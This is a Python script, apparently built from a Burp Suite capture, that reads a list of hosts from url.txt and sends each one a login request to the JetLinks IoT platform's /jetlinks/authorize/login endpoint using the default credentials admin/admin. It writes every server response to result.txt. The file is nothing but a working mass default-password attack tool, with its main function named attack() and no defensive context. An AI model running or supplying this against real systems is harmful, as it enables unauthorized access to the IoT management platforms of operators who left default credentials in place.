import requests
import sys


session = requests.session()
path=sys.path[0]
print(path)
def attack():
    for line in open(path+ "\\url.txt", encoding='utf-8'):
        host=str(line).replace('\n','')
        print(host)
        burp0_url = host + "/jetlinks/authorize/login"
        burp0_headers = {"Accept": "application/json", "X-Access-Token": "1634639633552", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36", "Content-Type": "application/json;charset=UTF-8", "Origin": "http://114.116.124.108:9000", "Referer": "http://114.116.124.108:9000/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        burp0_json={"expires": -1, "password": "admin", "tokenType": "default", "username": "admin", "verifyCode": "", "verifyKey": ""}
        try:
            response=session.post(burp0_url, headers=burp0_headers, json=burp0_json)
        except:
            pass
        #print(response.text)
        f=open(path+ '\\result.txt','a', encoding='utf-8')
        print(burp0_url+'\n')
        print(response.text)
        f.write(burp0_url+'\n')
        f.write(response.text)
        f.write('\n\n')
        f.close()

if __name__ == '__main__':
    attack()
